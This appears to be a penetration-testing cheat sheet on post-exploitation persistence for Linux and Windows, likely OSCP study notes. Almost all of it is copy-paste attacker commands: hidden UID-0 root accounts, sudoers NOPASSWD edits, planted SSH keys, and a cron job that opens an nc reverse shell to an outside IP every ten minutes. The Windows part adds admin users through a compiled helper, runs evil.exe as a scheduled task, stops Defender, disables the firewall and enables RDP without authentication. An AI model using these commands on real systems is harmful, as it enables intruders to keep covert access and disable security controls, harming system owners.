# Persistence on Linux

## Create a new user

```
adduser pelle
adduser pelle sudo
```

Or:
```
useradd -u0 -g0 -o -s /bin/bash -p `openssl passwd yourpass` rootuser
```

On older machine:
```
useradd pelle
passwd pelle
echo "pelle    ALL=(ALL) ALL" >> /etc/sudoers
```

Or directly edit `/etc/passwd`:
```
echo 'spotless::0:0:root:/root:/bin/bash' >> /etc/passwd
```

## Give root rights

```
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```

## Crack the password of existing user

Get the `/etc/shadow`

## SSH Key

```
ssh-keygen -t rsa -C "your_email@example.com"
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQqlhJKYtL/r9655iwp5TiUM9Khp2DJtsJVW3t5qU765wR5Ni+ALEZYwqxHPNYS/kZ4Vdv..." > .ssh/authorized_keys
chmod 600 .ssh/authorized_keys
ssh -i nameOfMyKey kim@192.168.1.103
```

## Cronjob

* Check if cronjob is active
```
service crond status
pgrep cron
```

* Start cronjob
```
service crond status
/etc/init.d/cron start
```

* Create a job
```
crontab -e
/10 * * * * nc -e /bin/sh 192.168.1.21 5556
/10 * * * * pelle nc -e /bin/sh 192.168.1.21 5556
```

## Backdoor in webserver

Put backdoor on webserver, either in separate file or in hidden in another file.

## Setuid on text-editor

You can setuid on an editor. So if you can easily enter as a www-data, you can easily escalate to root through the editor.

With `vi` it is extremely easy. You just run `:shell`, and it gives you a shell.

```
# Make root the owner of the file
chown root myBinary

# set the sticky bit/suid
chmod u+s myBinary
```

# Persistence on Windows

## Create a new user
```
net user spotless spotless /add & net localgroup Administrators spotless /add
```

Script to add a new user:
```
#include <stdlib.h> /* system, NULL, EXIT_FAILURE */

int main ()
{
  int i;
  i=system ("net user <username> <password> /add && net localgroup administrators <username> /add");
  return 0;
}

# Compile
i686-w64-mingw32-gcc -o useradd.exe useradd.c
```

## Scheduled task
```
# Launch evil.exe every 10 minutes
schtasks /create /sc minute /mo 10 /tn "TaskName" /tr C:\Windows\system32\evil.exe
```

## Disable firewall/defender

```
sc stop WinDefend
netsh advfirewall show allprofiles
netsh advfirewall set allprofiles state off
netsh firewall set opmode disable
```

## Enable RDP for all

```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

```
netsh firewall set service RemoteDesktop enable
```

```
sc config TermService start= auto
net start Termservice
netsh.exe
firewall
add portopening TCP 3389 "Remote Desktop"
```

```
netsh.exe advfirewall firewall add rule name="Remote Desktop - User Mode (TCP-In)" dir=in action=allow 
program="%%SystemRoot%%\system32\svchost.exe" service="TermService" description="Inbound rule for the 
Remote Desktop service to allow RDP traffic. [TCP 3389] added by LogicDaemon's script" enable=yes 
profile=private,domain localport=3389 protocol=tcp
```

```
netsh.exe advfirewall firewall add rule name="Remote Desktop - User Mode (UDP-In)" dir=in action=allow 
program="%%SystemRoot%%\system32\svchost.exe" service="TermService" description="Inbound rule for the 
Remote Desktop service to allow RDP traffic. [UDP 3389] added by LogicDaemon's script" enable=yes 
profile=private,domain localport=3389 protocol=udp
```

# References

* https://ired.team/offensive-security-experiments/offensive-security-cheetsheets#post-exploitation-and-maintaining-access
* https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html
* https://sushant747.gitbooks.io/total-oscp-guide/persistence.html
* https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-post-exploitation.html